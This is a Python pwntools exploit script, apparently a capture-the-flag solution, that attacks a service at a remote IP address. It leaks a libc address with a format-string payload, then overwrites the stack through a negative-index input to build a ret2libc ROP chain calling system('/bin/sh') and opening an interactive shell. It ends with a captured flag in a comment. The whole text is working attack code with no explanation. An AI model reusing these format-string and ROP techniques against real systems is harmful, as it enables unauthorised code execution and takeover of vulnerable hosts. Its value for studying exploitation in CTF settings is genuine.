from pwn import *
context.log_level='debug'
context.arch='amd64'
#p=process('./pwn')
p=remote("183.129.189.60",10001)
p.sendlineafter("?\n","Y")

p.sendafter(": ","%2$p".format().ljust(50,'A'))
got=0x000000000601fa0
main=0x4008e7
#gdb.attach(p,'b *printf')
p.sendlineafter("us?\n",str(-1))
p.readuntil("?\n")
for x in range(46):
	p.sendline("+")
p.sendline(str(main))
p.sendline(str(0))
for x in range(0xff-46-2):
	p.sendline("+")
p.readuntil("y much ")
base=int(p.read(14),16)-(0x7ffff7dd3790-0x7ffff7a0d000)
log.warning(hex(base))
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.sendlineafter("?\n","Y")
p.sendafter(": ","n132!\n")
p.sendlineafter("us?\n",str(-1))
p.readuntil("?\n")
for x in range(46):
	p.sendline("+")
libc.address=base
sys=libc.sym['system']
sh=libc.search('/bin/sh\x00').next()
rdi=0x0000000000400b73
p.sendline(str(rdi))
p.sendline(str(0))
p.sendline(str(sh&0xffffffff))
p.sendline(str(sh>>32))
p.sendline(str(sys&0xffffffff))
p.sendline(str(sys>>32))
for x in range(0xff-46-6):
	p.sendline("+")
p.readuntil("y much ")

p.interactive('n132>')
#flag{b342aeed-27c0-42cf-92d2-071f0020d809}

